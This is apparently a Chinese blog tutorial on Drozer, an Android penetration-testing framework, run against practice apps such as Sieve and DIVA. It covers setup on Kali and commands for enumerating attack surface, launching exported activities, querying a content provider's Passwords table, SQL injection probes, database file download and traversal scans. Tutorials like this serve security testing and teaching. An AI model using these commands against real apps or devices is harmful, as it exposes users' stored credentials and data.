---
layout:     post
title:      Android渗透框架-Drozer教程
subtitle:   创建多窗口
date:       2019-04-05
author:     蓝胖
header-img: img/post-bg-2019-04-05.jpg
catalog: true
tags:
    - Android
    
  
---

>“我相信未来我们会生活在一个数据被时时监控的时代，被企业出于商业目的监控，被黑客出于牟利目的监控。这就像我们每个人都赤身露体行走在光天化日之下一样，想想就会让人不舒服。如果没有合理的法律和有效的技术保护手段，这将是最糟糕的时代。
但这个时代终将到来，不管我们是否喜欢它，只能做好迎接它的准备，不适者将被淘汰。我们能做的，是尽自己的微薄之力，按照我们的想法，将这个即将到来的时代塑造得更加美好”

# Kali安装Drozer
````python
root@kali:~# git clone https://github.com/mwrlabs/drozer/
root@kali:~# cd drozer/
root@kali:~/drozer# python2 setup.py build
root@kali:~/drozer# python2 setup.py install
````


[![AR443Q.png](https://s2.ax1x.com/2019/04/05/AR443Q.png)](https://imgchr.com/i/AR443Q)
# Kali安装adb
````python
root@kali:~# apt-get install android-tools-fastboo
root@kali:~# apt-get install android-tools-adb
````
[![AR4cHP.png](https://s2.ax1x.com/2019/04/05/AR4cHP.png)](https://imgchr.com/i/AR4cHP)
 
# 手机安装agent
agent下载地址：https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk
使用adb将agent安装到手机。
安装完成后，手机打开agent
### 端口转发
使⽤adb进⾏端⼝转发，转发到Drozer使⽤的端⼝31415。  **adb forward tcp:31415  tcp:31415**
# 运行Drozer

**drozer console connect**
[![AR4ynI.png](https://s2.ax1x.com/2019/04/05/AR4ynI.png)](https://imgchr.com/i/AR4ynI)


# 常用命令
```python
#列出所有模块
list
app.activity.forintent                   Find activities that can handle the given intent                           
app.activity.info                        Gets information about exported activities.                                    
app.activity.start                       Start an Activity                                                              
app.broadcast.info                       Get information about broadcast receivers                                      
app.broadcast.send                       Send broadcast using an intent                                                 
app.broadcast.sniff                      Register a broadcast receiver that can sniff particular intents  
```
```python
#列出设备中所有已安装的包
run app.package.list
```
[![AR46Bt.png](https://s2.ax1x.com/2019/04/05/AR46Bt.png)](https://imgchr.com/i/AR46Bt)

```python
#搜索包名
run app.package.list -f [app name]
```
[![AR4rjA.png](https://s2.ax1x.com/2019/04/05/AR4rjA.png)](https://imgchr.com/i/AR4rjA)

```python
#显示包的详细信息
run app.package.info -a [app name]
```
[![AR4RN8.png](https://s2.ax1x.com/2019/04/05/AR4RN8.png)](https://imgchr.com/i/AR4RN8)

```python
#查看包的可攻击点
run app.package.attacksurface [app name]

```
[![AR42Af.png](https://s2.ax1x.com/2019/04/05/AR42Af.png)](https://imgchr.com/i/AR42Af)

```python
#显示 manifest 文件
run app.package.manifest [app name]
run app.package.manifest jakhar.aseem.diva
```
[![AR4LNT.png](https://s2.ax1x.com/2019/04/05/AR4LNT.png)](https://imgchr.com/i/AR4LNT)


# 四大组件
## 一、activity 界面
> 应用程序中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。 Activity之间通过Intent进行通信。在Intent的描述结构中，有两个最重要的部分：动作和动作对应的数据。

使用apktool反编译出安装包的AndroidManifest.xml文件，可看到将activity的exported设置为true。说明存在被导出的分险
[![AR4W4S.md.png](https://s2.ax1x.com/2019/04/05/AR4W4S.md.png)](https://imgchr.com/i/AR4W4S)

```python
#查看对外的activity组件信息
run app.activity.info -a app_name
run app.activity/broadcast/Service/provider.info -a app_name
```

[![AR4Ijs.md.png](https://s2.ax1x.com/2019/04/05/AR4Ijs.md.png)](https://imgchr.com/i/AR4Ijs)

```python
#使用app.activity.start进行漏洞测试，弹出内部功能，说明存在越权漏洞
run app.activity.start --component [app_name]  [acitvity_name]
run app.activity.start --component com.huahua.testinh  com.huahua.testing.test
```

[![AR4h9g.md.png](https://s2.ax1x.com/2019/04/05/AR4h9g.md.png)](https://imgchr.com/i/AR4h9g)

## 二、Broadcast Receiver 应用进程通信
> BroadcastReceive广播接收器应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice 来响应它们收到的信息，或者用NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。



## 三、Service  后台服务

> 一个Service 是一段长生命周期的，没有用户界面的程序，可以用来开发如监控类程序。较好的一个例子就是一个正在从播放列表中播放歌曲的媒体播放器。在一个媒体播放器的应用中，应该会有多个activity，让使用者可以选择歌曲并播放歌曲。

## 四、Content Provider 应用数据管理
> android平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。这些数据可以存储在文件系统中、在一个SQLite数据库、或以任何其他合理的方式。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。只有需要在多个应用程序间共享数据是才需要内容提供者。

#### 信息泄露利用
```python
#扫描并获取Content Provider信息，并列出了可访问内容URI的列表和路径：
run scanner.provider.finduris -a app_name
```

[![AR4Tun.png](https://s2.ax1x.com/2019/04/05/AR4Tun.png)](https://imgchr.com/i/AR4Tun)

```python
#查询或修改数据库中的数据，发现存在数据泄露问题，访问uri可看到一些敏感信息
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/
```

[![AR45cj.md.png](https://s2.ax1x.com/2019/04/05/AR45cj.md.png)](https://imgchr.com/i/AR45cj)


#### SQL注入漏洞


```python
#同样content可能导致注入问题。使用以下语句进行测试发现报错，说明存在SQL注入漏洞。
 run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/
--projection "'" 

 run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/
--selection "'" 
```
[![AR4HH0.png](https://s2.ax1x.com/2019/04/05/AR4HH0.png)](https://imgchr.com/i/AR4HH0)
##### 注入点位置进行扫描
```python
run scanner.provider.injection -a  com.mwr.example.sieve
```

[![AR4qEV.png](https://s2.ax1x.com/2019/04/05/AR4qEV.png)](https://imgchr.com/i/AR4qEV)

##### 文件下载
```python
run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data
#执行成功后应该回显以下内容
/data/com.mwr.example.sieve/databases/database.db /home/user/database.db 
Written 24576 bytes
```
##### 目录遍历
```python
 run scanner.provider.traversal -a com.mwr.example.sieve
```
[![AR47Bq.png](https://s2.ax1x.com/2019/04/05/AR47Bq.png)](https://imgchr.com/i/AR47Bq)
